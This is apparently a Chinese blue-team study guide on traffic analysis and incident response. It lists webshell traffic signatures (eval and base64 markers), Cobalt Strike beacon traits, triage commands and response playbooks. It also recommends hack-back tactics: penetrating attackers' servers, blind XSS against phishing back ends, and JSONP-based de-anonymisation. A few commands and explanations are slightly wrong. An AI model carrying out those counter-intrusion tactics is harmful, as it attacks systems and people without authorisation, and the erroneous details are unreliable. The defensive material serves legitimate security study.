区分爬虫流量和攻击流量可以采用多种方法，例如通过IP地址、访问频率、请求内容、HTTP头部和用户行为等来进行判断。

1. IP地址：攻击者通常会使用代理服务器或者大量的IP地址来发起攻击，而爬虫流量通常来自一些固定的IP地址。因此，可以通过IP地址来区分爬虫流量和攻击流量。
2. 访问频率：攻击者通常会在短时间内频繁地访问Web应用程序，而爬虫流量通常是有一定时间间隔的。因此，可以通过访问频率来区分爬虫流量和攻击流量。
3. 请求内容：攻击者通常会发送一些非法的请求，例如包含恶意代码的请求，而爬虫流量通常是请求一些合法的内容。因此，可以通过请求的内容来区分爬虫流量和攻击流量。
4. HTTP头部：攻击者通常会伪造HTTP头部，而爬虫流量通常是使用正常的HTTP头部。因此，可以通过HTTP头部来区分爬虫流量和攻击流量。
5. 用户行为：攻击者通常会发起一些不符合正常用户行为的请求，例如访问不存在的页面或者频繁地进行登录尝试。而爬虫流量通常是符合正常用户行为的。因此，可以通过用户行为来区分爬虫流量和攻击流量。

#### 如何区分扫描流量和手动流量？

扫描流量和手动流量的区别在于其产生的方式和行为特征，因此可以通过以下几种方法来查看区分它们：

- 查看流量来源：扫描流量通常是由自动化工具或蠕虫病毒等程序生成的，因此其源 IP 或者发起请求的主机通常不固定，而手动流量则来自人工操作的设备，其请求的 IP 地址和用户代理信息都会有所不同。
- 检测流量频率和规律：扫描流量通常会呈现出周期性、规律性的访问行为，例如连续大量的 TCP SYN 请求等。而手动流量则通常难以呈现出明显的规律和周期性。
- 观察流量的请求路径和参数：扫描流量通常是为了探测系统漏洞和弱点而产生的，它们通常会对一些已知的 URL 和参数进行大量的尝试，并使用一些特殊的 HTTP 头部信息。而手动流量则更加多样化，可能会包含更丰富的请求路径和参数。
- 分析流量的响应状态码和长度：扫描流量通常会通过检测返回的状态码和页面长度等信息来判断目标是否存在漏洞或弱点。手动流量则通常会具有更加正常的响应状态码和页面长度。

总之，通过综合分析流量来源、访问规律、请求路径和参数以及响应状态码等特征，我们可以比较准确地区分扫描流量和手动流量，并采取相应的防御措施。

#### CS流量特征？

CS流量通常指客户端与服务器之间的通信流量，其特征与具体的应用程序和协议有关。以下是一些常见的CS流量特征：

1. 协议头：CS流量通常会包含协议头，用于指示通信协议和版本。
2. 请求方法：CS流量通常会包含请求方法，用于指示客户端请求的操作类型，例如GET、POST、PUT、DELETE等。
3. URL：CS流量通常会包含请求URL，用于指示客户端请求的资源路径。
4. 参数：CS流量通常会包含请求参数，用于传递客户端请求的数据，例如表单数据、查询参数等。
5. 响应状态码：CS流量通常会包含响应状态码，用于指示服务器对客户端请求的处理结果，例如200（成功）、404（未找到）等。
6. 响应内容：CS流量通常会包含响应内容，用于传递服务器响应的数据，例如HTML页面、JSON数据等。
7. 加密：CS流量可能会使用加密技术，例如SSL、TLS等，以保护通信内容的机密性和完整性。
8. 压缩：CS流量可能会使用压缩技术，例如GZIP、Deflate等，以减少通信内容的大小。

了解CS流量的特征可以帮助安全专家和网络管理员监测和检测网络中的异常活动和攻击，例如SQL注入、跨站点脚本攻击、恶意文件传输等。

对比正常的http流量，CS的http通信流量具有以下几个特征： 

- 心跳包特征 

​	a) 间隔一定时间，均有通信，且流级上的上下行数据长度固定； 

- 域名/IP特征 

​	a) 未走CDN、域前置的，域名及IP暴露

​	b) 走CDN、域前置的，真实IP会被隐藏； 

- 指令特征 

​	a) 下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。 

​	b) 指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。 

​	c) 不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。 

- 数据特征 

​	a) 在请求的返回包中，通信数据均隐藏在jqeury*.js中。

#### ⭐webshell流量特征？

**菜刀：**

伪造 X-Forwarded-For头，每次利用X-Forwarded-For头都会不同

执行了 base64_decode 函数对 z0 进行 base64 后，经过 eval 函数执行命令

QGluaV9

@ini_set("display_errors"

**c刀：** 

c刀是由java写的客户端，所以它的适用性比较强，linux、windows平台都可以用，cknife首先会查询服务器版本信息，接下来才是查询当前目录。由于cknife是基于菜刀改的，在流量上与菜刀是十分相似的

**蚁剑：**

如果用默认的蚁剑测试，连接时会请求两次

其请求体只是经过 url 编码

@ini_set("display_errors"

在执行命令，文件操作等地方会有0x开头的参数

**冰蝎：**

消息体内容采用 AES 加密

流量会以时间的方式生成长度 16 的随机 key

中间结果字符串 assert|eval("phpinfo();") 此数据由冰蝎加载器发出的，已经定义好的

**其他webshell**

Webshell是一种通过Web应用程序上传到服务器的恶意脚本文件，攻击者可以通过Webshell与服务器进行交互，执行各种操作，例如执行命令、上传或下载文件、访问敏感信息等。以下是一些常见的Webshell流量特征：

1. HTTP请求：Webshell通常是通过HTTP请求上传到服务器的，因此Webshell流量通常具有HTTP请求的特征，例如使用HTTP协议、请求头和请求体等。
2. 异常请求：Webshell上传请求可能会包含异常的请求头或请求体，例如包含大量随机字符、非法字符或特殊字符等。
3. 访问频率：Webshell通常会频繁访问服务器，例如执行命令、上传或下载文件等操作，因此Webshell流量的访问频率可能会非常高。
4. 非标准端口：攻击者可能会将Webshell上传到非标准的端口，例如8080、8888等，以避免被常规安全机制检测到。
5. 异常文件类型：Webshell通常是一些非常规的文件类型，例如PHP、ASP、JSP等，这些文件类型在正常的Web应用程序中并不常见。
6. 异常文件名：Webshell文件名通常会包含一些非常规的字符或字符串，例如随机字符、数字、特殊字符等，以避免被检测到。
7. 异常访问路径：Webshell文件通常会被上传到非常规的访问路径，例如隐藏的目录、随机生成的路径等，以避免被发现。

#### 常用的webshell检测工具？

D盾，河马WEBSHELL，百度WEBDIR+，WebShellDetector，SangforWebShellKill【深信服】，PHPMalwareFinder【支持Linux】。

#### 日志与流量分析？

日志和流量分析是网络安全领域中常用的两种技术。它们都可以帮助安全人员更好地了解系统的状态，检测和预防威胁。

日志分析是指对服务器、应用程序等产生的日志进行收集、存储、分析和处理，以便了解系统的运行状况和发现异常事件。通过对日志数据的统计和分析，可以追踪用户活动、系统错误、安全事件等，以及发现潜在的风险和漏洞。比如，通过分析登录日志可以检测到恶意登录尝试；通过分析访问日志可以了解网站的被攻击情况。

流量分析是指对网络流量进行收集、存储、分析和处理，以便了解网络连接的状态，检测和预防网络攻击。通过对流量数据的统计和分析，可以追踪网络通信、检测威胁和漏洞，比如检测恶意流量、DDoS攻击等。流量分析通常需要使用专业的工具和技术，包括网络协议分析、流量捕获和分析软件等。

综上所述，日志和流量分析是网络安全中非常重要的技术，它们可以帮助安全人员发现和解决潜在的安全问题，并维护系统和网络的正常运行。

#### 安全设备告警？

安全设备报警是指安全设备（例如入侵检测系统、防火墙、安全加固等）监测到的与安全相关的事件或活动达到了预先设定的规则和阈值，触发了警报通知。以下是一些处理安全设备报警的方法：

- 确认警告的真实性：首先需要确认收到的警报信息是否为真实的安全事件，需要对日志和其他相关信息进行分析和验证。如果发现确实存在安全问题，则需要立即采取适当措施。
- 优先级分类：不同类型的安全事件具有不同的严重程度和威胁级别，需要根据事件的类型、来源等因素进行分类和优先级排序，并采取相应的措施进行处理。
- 制定处理计划：根据事件情况和优先级，制定相应的处理计划和操作流程。这些计划可以包括隔离受感染主机、采取补救措施、收集证据等方面。
- 跟踪事件进展：在处理安全事件时，需要跟踪事件的进展和结果，并及时更新相关记录和文档。同时要保持与相关人员的沟通和协调，以便及时解决问题。
- 定期复查：定期审查和分析系统和设备的报警记录和日志，以及采取的应对措施和效果。这可以帮助发现系统中存在的风险和漏洞，并及时加以修复和优化。

总之，在处理安全设备报警时，需要快速响应、分类优先、制定计划等步骤，以保障系统的安全性，并且需要持续地监测和优化安全防御策略。

### ⭐应急响应经验

#### 研判的思路？

1.首先对攻击的来源进行判断，是内对内，外对内还是内对外的情况。

2.依据设备的告警信息结合具体情况来分析攻击行为的类型，比如说告警SQL注入攻击，那我们就去查看一下请求数据包里面是否有单引号，SELECT等敏感字符，返回数据包里面是否有SQL语法报错等信息，有的话就可以初步判断该攻击行为是SQL注入攻击。

3.然后就是根据攻击特征来分析攻击行为使用了什么技术或者说工具，比如说攻击的频率，数据包的信息等等。比如说在使用AWVS或者APPSCAN等工具在扫描的时候，很有可能在请求数据包的user-agent里面就有相关的信息。同样结合告警信息和具体情况来判断攻击行为的危害程度，比如说检测到多条攻击成功告警和内对内及内对外攻击告警，这个时候就需要尽快的交给应急组了。

4.结合设备告警信息及具体情况分析攻击意图，比如说攻击者的目标是主站还是旁站，是主机还是域控，不同的攻击意图对于后续的处理也不同。

5.最后根据我们掌握的信息采取相应的处置方式，比如说告警信息是误报，说明设备需要策略优化，不需要处置。告警信息是尝试攻击，暂时对资产没有影响，就需要后续持续关注，攻击成功时能够做到及时上报。如果告警确认不是误报，并且攻击成功时，我们就需要迅速上报及时采取应急响应。

#### 应急响应的思路？

1.首先应该是信息收集，比如说影响范围有多大，事件类型是什么，源头主机和攻击意图，是否需要保障业务等等信息，这一步可以帮助我们更有效的进行下一步的阻断攻击行为。

2.接下来就是结合已知的信息阻断攻击行为，保护资产。比如说攻击行为局限于某个站点，且未造成较大损失，那我们可以直接封掉攻击者的IP来确保业务的正常进行，当然之后也要对这个站点有一个持续的关注。如果是某台主机沦陷或者说域控服务器沦陷，那么这就算比较重大的损失，为了避免损失扩大，应该及时将感染设备断网处理。如果有备份服务器，可以切换备用设备来保障业务正常。

3.对攻击行为阻断后需要对数据进行保护，比如说保存好流量、可疑进程的内存、失陷系统镜像、恶意样本、设备的日志，这一步可以有效帮助我们后续的溯源工作。

4.安全事件影响根除，工具结合手工从系统用户是否有新增用户，进程信息，计划任务，自启动项，注册表，端口状态(是否有对外连接)等方面来检查是否有可疑行为，比如说火绒剑，ProcessHacker等专门用于分析这些方面的工具。如果有就直接关闭或者删除，有一些顽固进程或者顽固文件无法关闭或者删除可以结合专杀工具处理，比如说Rkhunter,火绒等工具。

5.恢复业务，加强安全措施，加固系统等，比如说更新软件版本，安装已知漏洞的补丁，关闭某些端口等等，暂时没有解决办法的可以根据业务需求关闭某些服务。
6.最后就是输出报告，总结反思。

#### 溯源反制的思路？

1.攻击源捕获

- 安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等
- 日志与流量分析，异常的通讯流量、攻击源与攻击目标等
- 服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等
- 邮件钓鱼，获取恶意文件样本、钓鱼网站 URL 等
- 蜜罐系统，获取攻击者 ID、电脑信息、浏览器指纹、行为、意图的相关信息

 2.溯源反制

- IP 定位技术
  根据IP定位物理地址–代理      IP
  溯源案例：通过 IP 端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息
- ID 追踪术
  ID 追踪术，搜索引擎、社交平台、技术论坛、社工库匹配
  溯源案例：利用 ID 从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息
- 网站 url
  域名 Whois 查询–注册人姓名、地址、电话和邮箱      --域名隐私保护
  溯源案例：通过攻击 IP 历史解析记录/域名，对域名注册信息进行溯源分析
- 恶意样本分析
  提取样本特征、用户名、ID、邮箱、C2 服务器等信息–同源分析
  溯源案例：样本分析过程中，发现攻击者的个人 ID 和 QQ，成功定位到攻击者
- 社交账号
  基于 JSONP 跨域，获取攻击者的主机信息、浏览器信息、真实 IP 及社交信息等
  利用条件：可以找到相关社交网站的 jsonp 接口泄露敏感信息，相关网站登录未注销

 3.攻击者画像

-  攻击路径

攻击目的：拿到权限、窃取数据、获取利益、DDOS 等
网络代理：代理 IP、跳板机、C2 服务器等
攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等

-  攻击者身份画像

虚拟身份：ID、昵称、网名
真实身份：姓名、物理位置
联系方式：手机号、qq/微信、邮箱
组织情况：单位名称、职位信息

#### 蓝队常用的反制方法有哪些？

- 蜜罐

- 对攻击目标进行反渗透（IP定位、IP端口扫描、Web站点渗透）

- 应用漏洞挖掘&利用（菜刀、Goby、Xray、蚁剑）

- id->社交特征关联

- 钓鱼网站->后台扫描、XSS盲打

- 木马文件->同源样本关联->敏感字符串特征检测

#### Windows和Linux应急响应的流程。

应急响应是一种重要的安全操作，用于响应已知或疑似的安全事件，以减轻潜在的安全风险。Windows和Linux的应急响应流程有一些相似之处，但也有一些特定于各个操作系统的差异。

Windows 应急响应流程：

1. 确认安全事件并进行识别：**确认系统是否受到了攻击或存在异常情况。收集和分析日志、警报和其他安全事件，以识别潜在的威胁。**当发生安全事件时，首先需要确认事件的类型和严重程度。可以使用一些安全监控工具，例如安全信息与事件管理系统(SIEM)、防火墙、入侵检测系统(IDS)等，来检测和识别安全事件。
2. 隔离和保护数据：**立即隔离受感染或受攻击的系统，断开其与网络的连接，以防止进一步的传播和损害。确保进行适当的备份和保护关键数据。**一旦确认了安全事件，应该立即停止安全事件的进一步扩散。可以使用一些安全工具，例如防火墙、入侵检测系统、终端安全软件等，来阻止安全事件的进一步发展。
3. 调查和分析、收集证据：在隔离和保护数据之后，需要立即开始收集证据。**进行深入的调查和分析，确定攻击的来源、方法和受影响的系统范围。收集并分析受攻击系统的日志、内存镜像、文件系统等信息，以获取更多的证据和线索。**可以使用一些工具，例如日志分析工具、进程监控工具、网络流量分析工具等，来收集安全事件的相关数据和信息。这些证据可以帮助分析安全事件的原因和影响。
4. 分析安全事件：收集证据之后，需要对安全事件进行分析。可以使用一些工具，例如病毒扫描工具、漏洞扫描工具、流量分析工具等，来分析安全事件的原因和影响。同时，需要分析安全事件的影响范围，以及可能受到影响的系统和数据。
5. 制定应急响应计划：**在分析安全事件之后，需要制定应急响应计划。该计划应该包括恢复受影响的系统和数据、修复安全漏洞、加强安全措施等。同时，需要制定应对未来安全事件的预防措施，以减轻潜在的安全风险。**
6. 恢复和修复：**修复受感染的系统，包括清除恶意软件、修补安全漏洞、恢复系统配置等。确保进行适当的测试和验证，以确保系统的完全恢复和安全性。**
7. 加固和提高安全性：审查和加固系统的安全配置，包括更新和打补丁操作系统和应用程序、配置安全策略和权限、增强身份验证等。实施安全最佳实践，提高系统和网络的整体安全性。

Linux 应急响应流程：

1. 确认和识别：确认系统是否受到了攻击或存在异常情况。收集和分析日志、警报和其他安全事件，以识别潜在的威胁。
2. 隔离和保护：立即隔离受感染或受攻击的系统，断开其与网络的连接，以防止进一步的传播和损害。确保进行适当的备份和保护关键数据。
3. 调查和分析：进行深入的调查和分析，确定攻击的来源、方法和受影响的系统范围。收集并分析受攻击系统的日志、内存镜像、文件系统等信息，以获取更多的证据和线索。
4. 恢复和修复：修复受感染的系统，包括清除恶意软件、修补安全漏洞、恢复系统配置等。确保进行适当的测试和验证，以确保系统的完全恢复和安全性。
5. 加固和提高安全性：审查和加固系统的安全配置，包括更新和打补丁操作系统和应用程序、配置安全策略和权限、增强身份验证等。实施安全最佳实践，提高系统和网络的整体安全性。

当然，实际的应急响应流程因时而异。在进行应急响应之前，建议制定详细的应急响应计划，并确保有合适的资源来应对潜在的安全事件。

#### Windows应急响应常用命令？

查看用户账号和组        lusrmgr

打开lusrmgr.msc，查看是否有新增/可疑的账号

敏感事件id:
4624 登录成功
4625 登录失败
4634 注销成功
4647 用户启动的注销
4672 使用超级用户/管理员用户进行登录
4720 创建用户
4697 7045 PsExec

查看自启动项                    msconfig

查看进程服务                    taskmgr

wmic process where name='进程名' list full 4      查看进程详细信息

taskkill /T /F /PID     强制关闭进程

wmic process | finderstr “xxxx.exe”    获取进程的全路径  

查看计划任务                    schtasks

查看用户会话                    query user

查看端口和网络连接          netstat -ano

查看本地共享                    net share

查看注册表                       regedit

查看日志                           eventvwr

#### Linux应急响应常用命令？

**查看进程**

top                           根据CPU占用率枚举进程

ps aux

ps aux | grep pid     根据进程号查看详细信息

ps elf | grep pid     根据进程号查看进程链

kill  -9   pid               杀死进程

lsof   -p   pid             查询守护进程

pstree         -aphn             树状显示进程 

​                 -a    显示该进程命令行参数

​                -p 显示pid       

​                -n 按照pid排序    

​                -h 高亮当前进程以及父进程

**查看网络连接**

netstat    -antlp

​                 -a 显示所有连接和端口

​                -n 以数字形式显示ip和port

​                -t 显示tcp

​                -l 显示监听的服务

​                -p 显示建立连接的进程名以及pid

ss                 –antpr

​                -a 显示所有连接和端口

​                -n 不解析服务的名称

​                -t 显示tcp sockets

​                -l 显示监听的端口
​                -p 显示监听端口的进程
​                -r 把ip解析为域名

**查看异常文件**

ls     -alth
        -a 显示所有文件
        -l 显示文件权限，属组属主，大小，日期
        \- t 按照时间顺序排序
        -h 高亮

find  /  -ctime  -2    查找72小时内新增的文件

**查看用户**

last                 查询最近登录的用户记录

lastlog            查询所有用户最后一次登录的时间

last lastb         登陆失败的用户记录

usermod   -L     用户名    禁用用户

userdel      -r     用户名    删除用户

**查看启动项**

systemctl list-unit-files | grep enable    查看启动项

**查看计划任务**

crontab -l         查看计划任务
crontab -e         编辑计划任务
crontab -r         删除计划任务
crontab -u         查看某用户计划任务

cat /etc/anacrontab     查看anacron异步定时任务

**查看历史命令**

history          查询主机历史命令

#### windows入侵排查思路？

检查系统账号安全

查看服务器是否有弱口令，远程管理端口是否对公网开放（使用 netstat -ano 命令、或者问服务器管理员）

命令查看服务器是否存在可疑账号、新增账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉

 D 盾或者注册表中查看服务器是否存在隐藏账号、克隆账号

结合日志，查看管理员登录时间、用户名是否存在异常

检查方法：Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开 “事件查看器”，导出 Windows 日志–安全，利用 Log Parser 进行分析。

#### Windows和Linux的日志文件放在哪里？

Windows操作系统的日志文件路径：

- 应用程序日志文件：C:\Windows\System32\winevt\Logs
- 系统日志文件：C:\Windows\System32\winevt\Logs
- 安全日志文件：C:\Windows\System32\winevt\Logs
- IIS日志文件：C:\inetpub\logs\LogFiles
- Exchange日志文件：C:\Program Files\Microsoft\Exchange Server\V15\Logging

Linux操作系统的日志文件路径：

- 系统日志文件：/var/log/syslog或/var/log/messages
- 安全日志文件：/var/log/secure或/var/log/auth.log
- 应用程序日志文件：/var/log/application_name.log（具体日志文件路径取决于应用程序的名称和配置）
- Apache日志文件：/var/log/apache2/access.log或/var/log/httpd/access_log
- MySQL日志文件：/var/log/mysql/error.log
- 不同的Linux发行版可能会有不同的日志文件名称和位置，例如Ubuntu和Debian使用的是syslog，而CentOS和Red Hat Enterprise Linux使用的是rsyslog。

> linux 日志文件说明
>
> /var/log/message 系统启动后的信息和错误日志，是 Red Hat Linux 中最常用的日志之一
>
> /var/log/secure 与安全相关的日志信息
>
> /var/log/maillog 与邮件相关的日志信息
>
> /var/log/cron 与定时任务相关的日志信息
>
> /var/log/spooler 与 UUCP 和 news 设备相关的日志信息
>
> /var/log/boot.log 守护进程启动和停止相关的日志消息
>
> /var/log/wtmp 该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件

在Linux上，您可以使用许多不同的命令来查看日志文件。常用的命令如下：

1. `less /var/log/messages`：查看系统消息日志文件的内容，包含系统各种活动的记录。
2. `tail -f /var/log/messages`：实时查看系统消息日志文件的内容，可用于监视系统活动。
3. `journalctl`：查看systemd日志，包括系统启动、服务启动、进程退出等信息。
4. `dmesg`：显示内核日志，包括系统启动时硬件检测、模块加载、内核错误等信息。
5. `less /var/log/auth.log`：查看系统认证日志，包括用户登录、su切换、sudo使用等信息。
6. `less /var/log/syslog`：查看系统日志，包括各种系统事件、进程日志、服务日志等信息。
7. `grep`命令：可以结合上述命令使用，用于过滤和搜索关键词，例如`grep "error" /var/log/messages`将显示消息日志中包含“error”的行。

需要注意的是，日志文件路径可能因操作系统版本和配置而有所不同。在查看日志文件前，最好先查看操作系统的文档或参考资料，以确定正确的日志文件路径。

#### Linux和Windows的安全加固

Linux系统安全加固：

1. 更新系统和软件：定期更新操作系统和软件可以修复已知的漏洞和安全问题，以减轻潜在的安全风险。
2. 禁用不必要的服务和端口：关闭系统中不必要的服务和端口，可以减少攻击面，提高系统的安全性。
3. 配置防火墙：配置防火墙可以限制外部访问和控制网络流量，以防止未经授权的访问和攻击。
4. 配置访问控制：设置强密码、限制远程访问、限制文件和目录的权限等，可以提高系统的安全性。
5. 安装安全软件：安装一些安全软件，例如入侵检测系统（IDS）、入侵防御系统（IPS）、安全信息和事件管理系统（SIEM）等，可以帮助检测和响应安全事件。

Windows系统安全加固：

1. 更新系统和软件：定期更新操作系统和软件，可以修复已知的漏洞和安全问题，以减轻潜在的安全风险。
2. 禁用不必要的服务和端口：关闭系统中不必要的服务和端口，可以减少攻击面，提高系统的安全性。
3. 配置防火墙：配置防火墙可以限制外部访问和控制网络流量，以防止未经授权的访问和攻击。
4. 配置访问控制：设置强密码、限制远程访问、限制文件和目录的权限等，可以提高系统的安全性。
5. 安装安全软件：安装一些安全软件，例如杀毒软件、防火墙、入侵检测系统（IDS）、入侵防御系统（IPS）等，可以帮助检测和响应安全事件。

需要注意的是，在进行Linux和Windows系统的安全加固时，需要遵循一些安全规范和最佳实践，例如备份数据、限制用户权限、加密数据传输等。同时，需要定期对系统进行安全审计和漏洞扫描，以及更新安全策略和控制措施，以适应不断变化的安全威胁。

#### 如何快速检测定位网站目录下的WebShell？

快速检测和定位网站目录下的WebShell可以采用以下步骤和技巧：

1. 文件扫描：使用工具如OWASP ZAP、Nikto或Burp Suite等，对网站目录进行文件扫描。这些工具可以自动检测常见的WebShell文件名和路径，并生成扫描报告。
2. 文件哈希比对：生成网站目录的文件哈希值，并与已知的恶意WebShell文件的哈希进行比对。如果有文件的哈希与已知WebShell文件的哈希匹配，则可能存在WebShell。
3. 文件特征分析：检查网站目录下的文件，查找与WebShell相关的特征，如可疑的文件名、嵌入的特殊字符串、奇怪的文件权限或时间戳等。一些常见的WebShell特征包括eval函数调用、base64编码、反向Shell连接等。
4. 文件内容分析：手动检查可疑文件的内容，查找是否存在WebShell的特征代码。WebShell通常包含与命令执行、文件操作、远程控制等相关的代码，可以通过审查文件内容来识别。
5. 日志分析：分析网站访问日志和服务器日志，查找与WebShell相关的异常请求、异常文件上传或访问行为。注意关注访问频率、来源IP、请求参数等信息，以便发现潜在的WebShell活动。
6. 恶意软件扫描：使用安全软件或防病毒软件对网站目录进行恶意软件扫描，以检测是否存在已知的WebShell恶意软件。
7. 文件比对：与正常的备份文件或源代码进行比对，以发现被修改或添加的可疑文件。比对过程中，注意关注文件内容的变化和未知文件的存在。
8. 安全监控工具：使用安全监控工具，如WAF（Web应用防火墙）、IDS（入侵检测系统）或WebShell扫描器，进行实时的WebShell检测和防御。

#### webshell应急处置流程

Webshell是一种常见的攻击工具，用于在受攻击的Web服务器上执行命令和控制服务器。以下是一般的Webshell应急处置流程：

1. 发现Webshell：通过监控和审计，检测到Web服务器上存在Webshell后，需要立即采取行动。
2. 切断网络连接：首先，需要立即切断Web服务器的网络连接，以防止Webshell继续执行命令或传输数据。
3. 收集证据：在切断网络连接后，需要立即开始收集证据。可以使用一些工具，例如日志分析工具、进程监控工具、网络流量分析工具等，来收集Webshell的相关数据和信息。
4. 分析Webshell：收集证据之后，需要对Webshell进行分析。可以使用一些工具，例如反病毒软件、Web服务器日志分析工具、文件扫描工具等，来分析Webshell的类型、功能、来源和影响范围。
5. 制定应急响应计划：在分析Webshell之后，需要制定应急响应计划。该计划应该包括清除Webshell、修复漏洞、加强访问控制等。同时，需要制定应对未来Webshell的预防措施，以减轻潜在的安全风险。
6. 清除Webshell：在制定应急响应计划之后，需要立即清除Webshell。可以使用一些工具，例如Web服务器防病毒软件、Web服务器文件扫描工具等，来清除Webshell和相关的恶意文件。
7. 恢复系统：在清除Webshell之后，需要恢复Web服务器的正常运行。可以使用一些工具，例如备份和还原工具、系统恢复工具等，来恢复Web服务器的正常运行。

需要注意的是，在进行Webshell应急处置时，需要遵循一些安全规范和最佳实践，例如备份数据、更新系统和软件、加强访问控制等。同时，需要对应急处置过程进行记录和报告，以便进行后续的审计和调查。

Webshell是指一种通过Web应用程序上传到服务器上的恶意脚本，可以用来窃取敏感信息、执行远程命令、传播恶意软件等。应急处理Webshell的流程通常包括以下步骤：

1. 隔离受感染的主机：首先，需要立即隔离受感染的主机，以防止恶意程序进一步感染其他系统。
2. 收集样本：对受感染主机进行取证，收集Webshell样本和相关日志，以便进一步分析排查。
3. 分析样本：对Webshell进行分析，了解其特征和行为，以确定其类型、攻击途径和攻击目的。
4. 查找Webshell位置：通过检查Web服务器的文件系统、数据库和日志等信息，找到Webshell的位置和攻击者的入口。
5. 删除Webshell：删除所有与Webshell相关的文件，包括Webshell文件、配置文件、日志文件等。
6. 修复漏洞：分析攻击途径，找到漏洞并修复它们，以防止类似攻击再次发生。
7. 恢复系统：对主机进行全面扫描和清除，恢复受感染系统的正常运行状态。
8. 监测和预防：加强安全防护措施，定期检查系统漏洞和安全漏洞，及时更新补丁，防范类似攻击的发生。

需要注意的是，Webshell通常比较难以清除，可能需要采取多种手段进行处理。同时，应急处理过程中需要遵循取证原则，确保取证过程合法有效。建议在应急处理之前，先评估风险并制定详细的应急响应计划。

#### 勒索病毒处置流程

勒索病毒是一种常见的网络安全威胁，它会加密或锁定计算机的文件和数据，并要求受害者支付赎金以获取解密或解锁的密钥。以下是一般的勒索病毒处置流程：

1. 发现勒索病毒：通过监控和审计，检测到受感染的计算机或网络上存在勒索病毒后，需要立即采取行动。
2. 切断网络连接：首先，需要立即切断受感染计算机或网络的网络连接，以防止勒索病毒继续扩散和传播。
3. 收集证据：在切断网络连接后，需要立即开始收集证据。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来收集勒索病毒的相关数据和信息。
4. 分析勒索病毒：收集证据之后，需要对勒索病毒进行分析。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来分析勒索病毒的类型、功能、来源和影响范围。
5. 制定应急响应计划：在分析勒索病毒之后，需要制定应急响应计划。该计划应该包括清除勒索病毒、恢复数据、修复漏洞等。同时，需要制定应对未来勒索病毒的预防措施，以减轻潜在的安全风险。
6. 清除勒索病毒：在制定应急响应计划之后，需要立即清除勒索病毒。可以使用一些工具，例如反病毒软件、系统修复工具等，来清除勒索病毒和相关的恶意文件。
7. 恢复数据：在清除勒索病毒之后，需要恢复数据。可以使用一些工具，例如备份和还原工具、数据恢复工具等，来恢复被勒索病毒加密或锁定的数据。
8. 修复漏洞：在清除勒索病毒和恢复数据之后，需要修复系统和应用程序中的漏洞，以减轻潜在的安全风险。

需要注意的是，在进行勒索病毒的处置过程中，需要遵循一些安全规范和最佳实践，例如备份数据、更新系统和软件、加强访问控制等。同时，需要对应急处置过程进行记录和报告，以便进行后续的审计和调查。另外，在面对勒索病毒时，不建议支付赎金，因为这可能会鼓励攻击者继续进行勒索攻击。

#### 挖矿病毒处置流程

挖矿病毒是一种常见的网络安全威胁，它会利用受感染计算机的计算资源来进行加密货币的挖掘。以下是一般的挖矿病毒处置流程：

1. 发现挖矿病毒：通过监控和审计，检测到受感染的计算机或网络上存在挖矿病毒后，需要立即采取行动。
2. 切断网络连接：首先，需要立即切断受感染计算机或网络的网络连接，以防止挖矿病毒继续扩散和传播。
3. 收集证据：在切断网络连接后，需要立即开始收集证据。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来收集挖矿病毒的相关数据和信息。
4. 分析挖矿病毒：收集证据之后，需要对挖矿病毒进行分析。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来分析挖矿病毒的类型、功能、来源和影响范围。
5. 制定应急响应计划：在分析挖矿病毒之后，需要制定应急响应计划。该计划应该包括清除挖矿病毒、修复漏洞、加强访问控制等。同时，需要制定应对未来挖矿病毒的预防措施，以减轻潜在的安全风险。
6. 清除挖矿病毒：在制定应急响应计划之后，需要立即清除挖矿病毒。可以使用一些工具，例如反病毒软件、系统修复工具等，来清除挖矿病毒和相关的恶意文件。
7. 修复漏洞：在清除挖矿病毒之后，需要修复系统和应用程序中的漏洞，以减轻潜在的安全风险。
8. 加强访问控制：在修复漏洞之后，需要加强访问控制。可以限制网络流量、加强账户和密码管理等，以防止未经授权的访问和攻击。

需要注意的是，在进行挖矿病毒的处置过程中，需要遵循一些安全规范和最佳实践，例如备份数据、更新系统和软件、加强访问控制等。同时，需要对应急处置过程进行记录和报告，以便进行后续的审计和调查。

#### 蠕虫病毒处置流程

蠕虫病毒是一种常见的网络安全威胁，它可以自我复制和传播，从而感染更多的计算机和网络。以下是一般的蠕虫病毒处置流程：

1. 发现蠕虫病毒：通过监控和审计，检测到受感染的计算机或网络上存在蠕虫病毒后，需要立即采取行动。
2. 切断网络连接：首先，需要立即切断受感染计算机或网络的网络连接，以防止蠕虫病毒继续扩散和传播。
3. 收集证据：在切断网络连接后，需要立即开始收集证据。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来收集蠕虫病毒的相关数据和信息。
4. 分析蠕虫病毒：收集证据之后，需要对蠕虫病毒进行分析。可以使用一些工具，例如反病毒软件、系统日志分析工具、文件扫描工具等，来分析蠕虫病毒的类型、功能、来源和影响范围。
5. 制定应急响应计划：在分析蠕虫病毒之后，需要制定应急响应计划。该计划应该包括清除蠕虫病毒、修复漏洞、加强访问控制等。同时，需要制定应对未来蠕虫病毒的预防措施，以减轻潜在的安全风险。
6. 清除蠕虫病毒：在制定应急响应计划之后，需要立即清除蠕虫病毒。可以使用一些工具，例如反病毒软件、系统修复工具等，来清除蠕虫病毒和相关的恶意文件。
7. 修复漏洞：在清除蠕虫病毒之后，需要修复系统和应用程序中的漏洞，以减轻潜在的安全风险。
8. 加强访问控制：在修复漏洞之后，需要加强访问控制。可以限制网络流量、加强账户和密码管理等，以防止未经授权的访问和攻击。

